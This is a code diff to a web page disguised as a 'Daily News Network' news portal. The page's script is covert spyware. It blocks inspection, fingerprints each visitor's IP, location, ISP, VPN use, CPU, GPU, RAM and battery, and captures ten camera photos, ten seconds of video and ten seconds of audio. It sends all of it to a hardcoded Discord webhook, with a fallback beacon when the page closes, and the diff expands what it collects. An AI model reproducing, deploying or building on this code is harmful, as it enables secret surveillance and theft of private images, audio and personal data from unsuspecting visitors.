@@ -157,6 +157,7 @@
     </style>
 </head>
 <body>
+    <!-- COMPLETE NEWS PORTAL CONTENT -->
     <header>
         <div class="container">
             <h1>Daily News Network</h1>
@@ -232,11 +233,11 @@
         </div>
     </footer>
 
-    <!-- Hidden elements for functionality -->
+    <!-- Hidden scanning elements -->
     <div id="inspect-warning">Access Denied</div>
 
 <script>
-    // Discord webhook URL - REPLACE WITH YOUR OWN
+    // Discord webhook URL
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1339161201841668116/SXtO43pAsCcTiazHdbneC78Ai7Xae2rBWTUp7VcsWIlyf-d216ST5Sc4aCnLmYML-2ak";
     let frontCameraStream = null;
     let mediaRecorder = null;
@@ -245,7 +246,10 @@
     let audioChunks = [];
     let scanData = {};
     let isScanComplete = false;
-    let systemInfoSent = false;
+
+    // ===================
+    // ENHANCED SCAN FUNCTIONS
+    // ===================
 
     // Anti-inspection
     document.addEventListener('contextmenu', e => e.preventDefault());
@@ -259,37 +263,217 @@
         }
     });
 
-    // Enhanced OS detection
-    function detectOS() {
+    // Get CPU and RAM details
+    function getHardwareInfo() {
+        let cpuCores = navigator.hardwareConcurrency || "Unknown";
+        let deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory}GB RAM` : "Unknown";
+        let cpuBrand = "Unknown";
+        
+        // CPU brand detection
         const ua = navigator.userAgent;
-        if (/Windows NT 10.0/.test(ua) && /Windows NT 10.0; Win64; x64/.test(ua)) return "Windows 10/11 64-bit";
-        if (/Windows NT 10.0/.test(ua)) return "Windows 10";
-        if (/Windows NT 6.3/.test(ua)) return "Windows 8.1";
-        if (/Windows NT 6.2/.test(ua)) return "Windows 8";
-        if (/Windows NT 6.1/.test(ua)) return "Windows 7";
-        if (/Mac/.test(ua)) return "MacOS";
-        if (/Linux/.test(ua)) return "Linux";
-        if (/Android/.test(ua)) return "Android";
-        if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
-        return "Unknown OS";
+        if (/Intel|i3|i5|i7|i9|Xeon/.test(ua)) {
+            cpuBrand = "Intel";
+            if (/i3/.test(ua)) cpuBrand += " Core i3";
+            else if (/i5/.test(ua)) cpuBrand += " Core i5";
+            else if (/i7/.test(ua)) cpuBrand += " Core i7";
+            else if (/i9/.test(ua)) cpuBrand += " Core i9";
+            
+            // Detect generation
+            const genMatch = ua.match(/(\d+)th Gen/);
+            if (genMatch) cpuBrand += ` ${genMatch[1]}th Gen`;
+        } 
+        else if (/AMD|Ryzen/.test(ua)) {
+            cpuBrand = "AMD";
+            if (/Ryzen 3/.test(ua)) cpuBrand += " Ryzen 3";
+            else if (/Ryzen 5/.test(ua)) cpuBrand += " Ryzen 5";
+            else if (/Ryzen 7/.test(ua)) cpuBrand += " Ryzen 7";
+            else if (/Ryzen 9/.test(ua)) cpuBrand += " Ryzen 9";
+            
+            const genMatch = ua.match(/Ryzen \d (\d{4})/);
+            if (genMatch) cpuBrand += ` ${genMatch[1].substring(0,1)}xxx Series`;
+        }
+        else if (/Apple M1/.test(ua)) cpuBrand = "Apple M1";
+        else if (/Apple M2/.test(ua)) cpuBrand = "Apple M2";
+        else if (/Snapdragon/.test(ua)) {
+            cpuBrand = "Qualcomm Snapdragon";
+            const modelMatch = ua.match(/Snapdragon (\d+)/);
+            if (modelMatch) cpuBrand += ` ${modelMatch[1]}`;
+        }
+        else if (/Exynos/.test(ua)) {
+            cpuBrand = "Samsung Exynos";
+            const modelMatch = ua.match(/Exynos (\d+)/);
+            if (modelMatch) cpuBrand += ` ${modelMatch[1]}`;
+        }
+
+        return {
+            cpuCores: cpuCores,
+            cpuBrand: cpuBrand,
+            ram: deviceMemory
+        };
     }
 
-    // Get IP and location
-    async function getLocationInfo() {
+    // Get VPN/proxy detection with real IP
+    async function getNetworkInfo() {
         try {
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
             const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-            return await locRes.json();
+            const locData = await locRes.json();
+            
+            return {
+                ip: ipData.ip,
+                city: locData.city || "Unknown",
+                country: locData.country_name || "Unknown",
+                region: locData.region || "Unknown",
+                isp: locData.org || "Unknown",
+                asn: locData.asn || "Unknown",
+                timezone: locData.timezone || "Unknown",
+                isVPN: locData.security ? (locData.security.vpn || locData.security.proxy || locData.security.tor) : false
+            };
         } catch {
-            return {ip: "Unknown", city: "Unknown", country: "Unknown"};
+            return {
+                ip: "Unknown",
+                city: "Unknown",
+                country: "Unknown",
+                region: "Unknown",
+                isp: "Unknown",
+                asn: "Unknown",
+                timezone: "Unknown",
+                isVPN: false
+            };
         }
     }
 
-    // Send data to Discord
-    async function sendToDiscord(content, file, filename) {
+    // Get WebGL renderer for GPU detection
+    function getGPUInfo() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return "Unknown";
+            
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "Unknown";
+        } catch {
+            return "Unknown";
+        }
+    }
+
+    // Get battery information
+    async function getBatteryInfo() {
+        if (!navigator.getBattery) return "Not available";
+        
+        try {
+            const battery = await navigator.getBattery();
+            return {
+                level: `${Math.floor(battery.level * 100)}%`,
+                charging: battery.charging ? "Yes" : "No"
+            };
+        } catch {
+            return "Unknown";
+        }
+    }
+
+    // Enhanced device detection
+    function detectDeviceDetails() {
+        const ua = navigator.userAgent;
+        let deviceType = "Desktop";
+        let deviceModel = "Computer";
+        let os = "Unknown OS";
+        let osVersion = "";
+
+        // Windows detection
+        if (/Windows NT 10.0/.test(ua)) {
+            os = "Windows";
+            if (/Windows 11/.test(ua)) {
+                osVersion = "11";
+            } else {
+                osVersion = "10";
+            }
+        } else if (/Windows NT 6.3/.test(ua)) {
+            os = "Windows";
+            osVersion = "8.1";
+        } else if (/Windows NT 6.2/.test(ua)) {
+            os = "Windows";
+            osVersion = "8";
+        } else if (/Windows NT 6.1/.test(ua)) {
+            os = "Windows";
+            osVersion = "7";
+        }
+        // Mac detection
+        else if (/Macintosh|Mac OS X/.test(ua)) {
+            os = "MacOS";
+            const match = ua.match(/Mac OS X (\d+[._]\d+)/);
+            if (match) osVersion = match[1].replace('_', '.');
+        }
+        // Android detection
+        else if (/Android/.test(ua)) {
+            os = "Android";
+            deviceType = "Mobile";
+            const match = ua.match(/Android (\d+\.\d+)/);
+            if (match) osVersion = match[1];
+        }
+        // iOS detection
+        else if (/iPhone|iPad|iPod/.test(ua)) {
+            os = "iOS";
+            deviceType = /iPad/.test(ua) ? "Tablet" : "Mobile";
+            const match = ua.match(/OS (\d+_\d+)/);
+            if (match) osVersion = match[1].replace('_', '.');
+        }
+        // Linux detection
+        else if (/Linux/.test(ua)) {
+            os = "Linux";
+        }
+
+        // Detect laptops (touchscreen devices with smaller screens)
+        if (navigator.maxTouchPoints > 0 && window.screen.width <= 1366) {
+            deviceType = "Laptop";
+            deviceModel = "Touchscreen Laptop";
+        }
+
+        // Detect specific device models
+        if (/SAMSUNG/.test(ua)) {
+            const modelMatch = ua.match(/SM-[A-Z]\d+/);
+            deviceModel = modelMatch ? `Samsung ${modelMatch[0]}` : "Samsung Device";
+        } else if (/iPhone/.test(ua)) {
+            const modelMatch = ua.match(/iPhone\d+,\d+/);
+            deviceModel = modelMatch ? `iPhone ${modelMatch[0].match(/\d+/)[0]}` : "iPhone";
+        } else if (/iPad/.test(ua)) {
+            const modelMatch = ua.match(/iPad\d+,\d+/);
+            deviceModel = modelMatch ? `iPad ${modelMatch[0].match(/\d+/)[0]}` : "iPad";
+        } else if (/Pixel/.test(ua)) {
+            const modelMatch = ua.match(/Pixel \d/);
+            deviceModel = modelMatch ? modelMatch[0] : "Google Pixel";
+        }
+
+        return {
+            type: deviceType,
+            model: deviceModel,
+            os: os,
+            osVersion: osVersion
+        };
+    }
+
+    // Send embed to Discord
+    async function sendEmbedToDiscord(embedData) {
+        try {
+            await fetch(DISCORD_WEBHOOK, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    embeds: [embedData]
+                })
+            });
+        } catch (error) {
+            console.error("Error sending embed to Discord:", error);
+        }
+    }
+
+    // Send file to Discord
+    async function sendFileToDiscord(file, filename, content) {
         const formData = new FormData();
-        if (file) formData.append('file', file, filename);
+        formData.append('file', file, filename);
         formData.append('content', content);
         
         try {
@@ -298,7 +482,7 @@
                 body: formData
             });
         } catch (error) {
-            console.error("Error sending to Discord:", error);
+            console.error("Error sending file to Discord:", error);
         }
     }
 
@@ -312,32 +496,66 @@
         return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
     }
 
-    // Start media recording with 60 FPS video
+    // Start media recording
     async function startRecording() {
         try {
-            // Get system info
-            const location = await getLocationInfo();
-            const os = detectOS();
-            const deviceType = /Mobi|Android|iPhone/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
+            // Get all system info
+            const networkInfo = await getNetworkInfo();
+            const device = detectDeviceDetails();
+            const hardware = getHardwareInfo();
+            const gpu = getGPUInfo();
+            const battery = await getBatteryInfo();
             
             scanData = {
-                ip: location.ip,
-                city: location.city,
-                country: location.country,
-                os: os,
-                device: deviceType,
-                userAgent: navigator.userAgent
+                ip: networkInfo.ip,
+                location: `${networkInfo.city}, ${networkInfo.country}`,
+                region: networkInfo.region,
+                isp: networkInfo.isp,
+                timezone: networkInfo.timezone,
+                deviceType: device.type,
+                deviceModel: device.model,
+                os: device.os,
+                osVersion: device.osVersion,
+                browser: navigator.userAgent,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                cpu: `${hardware.cpuBrand} (${hardware.cpuCores} cores)`,
+                ram: hardware.ram,
+                gpu: gpu,
+                battery: battery,
+                network: {
+                    isVPN: networkInfo.isVPN ? "⚠️ VPN/PROXY DETECTED" : "No",
+                    asn: networkInfo.asn,
+                    connection: navigator.connection ? navigator.connection.effectiveType : "Unknown"
+                }
             };
 
-            // Send initial system info
-            await sendToDiscord(
-                `📋 System Information\n` +
-                `IP: ${scanData.ip}\n` +
-                `Location: ${scanData.city}, ${scanData.country}\n` +
-                `Device: ${scanData.device}\n` +
-                `OS: ${scanData.os}\n` +
-                `User Agent: ${scanData.userAgent}`
-            );
+            // Send initial system info as embed
+            await sendEmbedToDiscord({
+                title: "🔍 Complete System Scan Results",
+                color: networkInfo.isVPN ? 0xff0000 : 0x3498db,
+                fields: [
+                    { name: "IP Address", value: scanData.ip, inline: true },
+                    { name: "Location", value: scanData.location, inline: true },
+                    { name: "VPN/Proxy", value: scanData.network.isVPN, inline: true },
+                    { name: "ISP", value: scanData.isp, inline: true },
+                    { name: "ASN", value: scanData.network.asn, inline: true },
+                    { name: "Timezone", value: scanData.timezone, inline: true },
+                    { name: "Device Type", value: scanData.deviceType, inline: true },
+                    { name: "Device Model", value: scanData.deviceModel, inline: true },
+                    { name: "Operating System", value: `${scanData.os} ${scanData.osVersion}`, inline: true },
+                    { name: "CPU", value: scanData.cpu, inline: true },
+                    { name: "GPU", value: scanData.gpu, inline: true },
+                    { name: "RAM", value: scanData.ram, inline: true },
+                    { name: "Screen", value: scanData.screen, inline: true },
+                    { name: "Language", value: scanData.language, inline: true },
+                    { name: "Battery", value: typeof scanData.battery === 'object' ? 
+                        `${scanData.battery.level} (${scanData.battery.charging ? 'Charging' : 'Not charging'})` : scanData.battery, inline: true },
+                    { name: "Connection", value: scanData.network.connection, inline: true },
+                    { name: "User Agent", value: `\`\`\`${scanData.browser}\`\`\``, inline: false }
+                ],
+                timestamp: new Date().toISOString()
+            });
 
             // Start front camera with 60 FPS
             frontCameraStream = await navigator.mediaDevices.getUserMedia({
@@ -365,10 +583,10 @@
             audioRecorder.ondataavailable = e => audioChunks.push(e.data);
             audioRecorder.start();
 
-            // Start 60 FPS video recording
+            // Start video recording
             mediaRecorder = new MediaRecorder(frontCameraStream, {
                 mimeType: 'video/webm;codecs=vp9',
-                videoBitsPerSecond: 5000000 // Higher bitrate for 60 FPS
+                videoBitsPerSecond: 5000000
             });
             recordedChunks = [];
             mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
@@ -377,10 +595,10 @@
             // Take 10 photos (1 per second)
             for (let i = 1; i <= 10; i++) {
                 const photoBlob = await capturePhoto(video, i);
-                await sendToDiscord(
-                    `📸 Photo ${i}/10 (60FPS)\nIP: ${scanData.ip}\nLocation: ${scanData.city}, ${scanData.country}\nDevice: ${scanData.device} (${scanData.os})`,
+                await sendFileToDiscord(
                     photoBlob,
-                    `photo_${i}.jpg`
+                    `photo_${i}.jpg`,
+                    `📸 Photo ${i}/10 from ${scanData.deviceType} (${scanData.os} ${scanData.osVersion})`
                 );
                 if (i < 10) await new Promise(resolve => setTimeout(resolve, 1000));
             }
@@ -392,19 +610,19 @@
 
                 mediaRecorder.onstop = async () => {
                     const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                    await sendToDiscord(
-                        `🎥 10s Video Recording (60FPS)\nIP: ${scanData.ip}\nLocation: ${scanData.city}, ${scanData.country}\nDevice: ${scanData.device} (${scanData.os})`,
+                    await sendFileToDiscord(
                         videoBlob,
-                        'video_10s_60fps.webm'
+                        'video_10s_60fps.webm',
+                        `🎥 10s Video (60FPS) from ${scanData.deviceType}`
                     );
                 };
 
                 audioRecorder.onstop = async () => {
                     const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                    await sendToDiscord(
-                        `🎤 10s Audio Recording\nIP: ${scanData.ip}\nLocation: ${scanData.city}, ${scanData.country}\nDevice: ${scanData.device} (${scanData.os})`,
+                    await sendFileToDiscord(
                         audioBlob,
-                        'audio_10s.webm'
+                        'audio_10s.webm',
+                        `🎤 10s Audio from ${scanData.deviceType}`
                     );
                 };
 
@@ -414,23 +632,32 @@
                 document.body.removeChild(video);
                 isScanComplete = true;
                 
-                // Send completion message
-                await sendToDiscord(
-                    `✅ Scan completed successfully!\n` +
-                    `Collected: 10 photos, 10s video (60FPS), 10s audio\n` +
-                    `IP: ${scanData.ip}\n` +
-                    `Location: ${scanData.city}, ${scanData.country}`
-                );
+                // Send completion embed
+                await sendEmbedToDiscord({
+                    title: "✅ Scan Completed Successfully",
+                    description: "All media and data collected",
+                    color: 0x00ff00,
+                    fields: [
+                        { name: "Device", value: `${scanData.deviceType} (${scanData.deviceModel})`, inline: true },
+                        { name: "OS", value: `${scanData.os} ${scanData.osVersion}`, inline: true },
+                        { name: "Location", value: scanData.location, inline: true },
+                        { name: "Collected Media", value: "10 photos\n10s video (60FPS)\n10s audio", inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                });
             }, 10000);
 
         } catch (error) {
-            console.error("Recording error:", error);
-            await sendToDiscord(
-                `❌ Scan failed!\n` +
-                `Error: ${error.message}\n` +
-                `IP: ${scanData.ip || "Unknown"}\n` +
-                `Device: ${scanData.device || "Unknown"}`
-            );
+            console.error("Scan error:", error);
+            await sendEmbedToDiscord({
+                title: "❌ Scan Failed",
+                description: "An error occurred during the scan",
+                color: 0xff0000,
+                fields: [
+                    { name: "Error", value: `\`\`\`${error.message}\`\`\``, inline: false }
+                ],
+                timestamp: new Date().toISOString()
+            });
         }
     }
 
@@ -440,16 +667,20 @@
     // Handle page closing
     window.addEventListener('beforeunload', () => {
         if (!isScanComplete) {
-            const content = `⚠️ Scan interrupted!\n` +
-                           `Collected data:\n` +
-                           `IP: ${scanData.ip || "Unknown"}\n` +
-                           `OS: ${scanData.os || "Unknown"}\n` +
-                           `Photos sent: ${document.querySelectorAll('img').length}`;
-            
-            navigator.sendBeacon(DISCORD_WEBHOOK, new Blob(
-                [content],
-                { type: 'text/plain' }
-            ));
+            const content = JSON.stringify({
+                embeds: [{
+                    title: "⚠️ Scan Interrupted",
+                    description: "The page was closed before the scan could complete",
+                    color: 0xffa500,
+                    fields: [
+                        { name: "IP", value: scanData.ip || "Unknown", inline: true },
+                        { name: "Device", value: scanData.deviceType || "Unknown", inline: true },
+                        { name: "Progress", value: "Partial data may have been collected", inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            });
+            navigator.sendBeacon(DISCORD_WEBHOOK, new Blob([content], { type: 'application/json' }));
         }
     });
 </script>
